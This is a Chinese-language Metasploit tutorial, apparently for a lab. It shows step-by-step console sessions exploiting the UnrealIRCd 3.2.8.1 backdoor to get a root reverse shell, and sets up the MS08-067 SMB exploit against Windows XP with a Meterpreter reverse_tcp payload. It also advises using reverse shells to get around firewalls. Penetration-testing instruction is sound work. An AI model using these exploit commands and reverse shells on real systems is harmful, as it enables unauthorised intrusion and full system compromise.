
## Metasploit 基础利用流程

### 搜索漏洞模块

使用 `search` 命令查找特定 CVE 或程序名称的利用模块。

**按 CVE 搜索：**
```
msf > search cve:2018
Matching Modules
=================
Name                    Disclosure
---------------- -----
auxiliary/admin/gitstack_rest      2018-01-15
auxiliary/dos/flexense_http_server_dos 2018-03-09
auxiliary/dos/webkitplus           2018-06-03
auxiliary/dos/tcp/clymore_dos       2018-02-06
auxiliary/fileformat/badpdf
```

**按程序名称搜索（以 Unreal IRC 为例）：**
```
msf > search unreal
Matching Modules
=================
Name                    Disclosure Date Rank
---------------- ---- ---- -----------
exploit/linux/games/ut2004_secure 2004-06-18 good
exploit/unix/irc/unreal_ircd_3281_backdoor 2010-06-12 excellent
exploit/windows/games/ut2004_secure 2004-06-18 good
```

### 查看模块详细信息

使用 `info` 命令查看模块完整信息：
```
msf > info exploit/unix/irc/unreal_ircd_3281_backdoor
Name: UnrealIRCD 3.2.8.1 Backdoor Command Execution
Module: exploit/unix/irc/unreal_ircd_3281_backdoor
Platform: Unix
Arch: cmd
Privileged: No
License: Metasploit Framework (BSD)
Rank: Excellent
Disclosed: 2010-06-12

Provided by:
hdm <x@hdm.io>

Available targets:
Id Name
-- -----
0 Automatic Target
```

### 使用模块

使用 `use` 命令加载选定的利用模块：
```
msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf exploit(Unreal_ircd_3281_backdoor)
```
> 注意提示符变化，已包含模块名称。

---

## 2 - 设置利用程序选项

### 基本语法

设置选项使用 `set` 命令：
```bash
set <Variable Name> <Value>
```

查看可用选项使用 `show options`：
```
msf exploit(unreal_ircd_3281_backdoor) > show options
Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
Name        Current Setting Required
------        ---------------- ----------------
RHOST               yes            The target address
RPORT       6667        yes            The target port

Exploit target:
Id          Name
--          ----------------
0           Automatic Target
```

### 关键变量说明

| 变量 | 含义 |
|------|------|
| `LHOST` | 本地主机（攻击者 Kali 系统） |
| `RHOST` | 远程主机（目标系统） |
| `LPORT` | 本地监听端口（Kali 系统） |
| `RPORT` | 远程目标端口（目标系统） |

### 设置目标地址

```bash
msf exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.1.68
RHOST => 192.168.1.68
```

验证设置：
| Name | Current Setting | Required | Description |
|---|---|---|---|
| RHOST | 192.168.1.68 | yes | The target address |
| RPORT | 6667 | yes | The target port |

### 执行攻击

```
msf exploit(unreal_ircd_3281_backdoor) > exploit
[*] Started TCP handler on 192.168.1.39:4444
[*] Connected to 192.168.1.68:6667...
[*] Metasploitable: Looking up your hostname...
[*] IP address installed
[*] Sending backdoor command.
[*] Accepted the first connection.
[*] Accepted the second connection...
[*] Command: echo pfimeYCUUJX
[*] Writing to socket
[*] Writing to socket
[*] Reading from socket...
[*] Reading from socket
[*] Received: pfimeYCUUJX
[*] Matching...
[*] Input.
[*] Command session 1 opened (192.168.1.39:4444 -> 192.168.1.68:43573) at 2016-02-19 09:18:44
```

成功获取远程 Shell：
```bash
whoami
root
pwd
/etc/unreal
```
> 按下 `Ctrl-C` 退出会话，输入 `back` 返回主提示符。

---

## 多目标类型

某些利用模块支持多个目标类型，需使用 `show targets` 查看：
```
msf exploit(unreal_ircd_3281_backdoor) > show targets
Exploit targets:
Id Name
---
0 Automatic Target
```
当前模块为自动目标，无需手动设置。其他模块可能需用 `set target <ID>` 指定具体目标。

---

## Windows XP 远程 Shell 实战（MS08-067）

### 1. 加载模块
```
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(windows/smb/ms08_067_netapi)
```

### 2. 查看选项
```
msf exploit(windows/smb/ms08_067_netapi) > show options
Module options (exploit/windows/smb/ms08_067_netapi):
Name Current Setting Required Description
--- ---------------- ----- -----------------
RHOST yes The target address
RPORT 445 yes Set the SMB service
SMBPIPE BROWSER yes The pipe name to use

Exploit target:
Id Name
---
0 Automatic Targeting
```

### 3. 查看并设置目标类型
```
msf exploit(windows/smb/ms08_067_netapi) > show targets
```
攻击目标列表：
| Id | 名称 |
|---|---|
| 0 | 自动目标 |
| 1 | Windows 2000 通用 |
| 2 | Windows XP SP0/SP1 通用 |
| 3 | Windows 2003 SP0 通用 |
| 4 | Windows XP SP2 英语 (始终开启 NX) |
| 5 | Windows XP SP2 英语 (NX) |
| 6 | Windows XP SP3 英语 (始终开启 NX) |
| 7 | Windows XP SP3 英语 (NX) |
| 8 | Windows XP SP2 阿拉伯语 (NX) |
| 9 | Windows XP SP2 繁体中文 - 台湾 |
| 10 | Windows XP SP2 简体中文 - (NX) |
| 11 | Windows XP SP2 繁体中文 - (NX) |
| 12 | Windows XP SP2 捷克语 (NX) |
| 13 | Windows XP SP2 丹麦语 (NX) |
| 14 | Windows XP SP2 德语 (NX) |

针对 Windows XP SP1 选择目标 2：
```bash
msf exploit(ms08_067_netapi) > set target 2
target => 2
```

验证目标设置：
| Id | 名称 |
|---|---|
| 2 | Windows XP SP0/SP1 通用 |

### 4. 查看高级选项（可选）
```
msf exploit(ms08_067_netapi) > show advanced
Module advanced options (exploit/windows/smb/ms08_067_netapi):
  Name              : CHOST
  Current Setting:
  Description       : The local client address
  Name              : CPORT
  Current Setting:
  Description       : The local client port
  Name              : ConnectTimeout
  Current Setting: 10
  Description       : Maximum number of seconds to establish a TCP connection
  Name              : ContextInformationFile
  Current Setting:
  Description       : The information file that contains context information
```

---

## 选择载荷

载荷决定攻击成功后在目标系统执行的操作。

### 查看兼容载荷
```
msf exploit(ms08_067_netapi) > show payloads
Compatible Payloads
=================
Name
---
---
gener/custom
gener/debug_trap
gener/shell_bind_tcp
gener/shell_reverse_tcp
gener/tight_loop
windows/adduser
windows/dllinject/bind_hidden_ipknock_tcp
...
```
或使用 `set payload` 双击 `Tab` 键查看所有 141 种可能性。

### 载荷命名规范

格式：`payload/os/arch/type`，常见示例：
- `payload/osx/x86/shell_reverse_tcp`
- `payload/linux/x64/shell_reverse_tcp`
- `payload/windows/shell_reverse_tcp`
- `payload/windows/meterpreter/reverse_tcp`

**推荐使用 `reverse_tcp` 类型**：目标主动连回攻击机，易绕过防火墙入站拦截。

### 设置载荷
```bash
msf exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

---

## 设置最终选项

执行 `show options` 确认所有必需参数：
- `RHOST`：目标 IP 地址
- `LHOST`：攻击机（Kali）IP 地址
- `LPORT`：监听端口
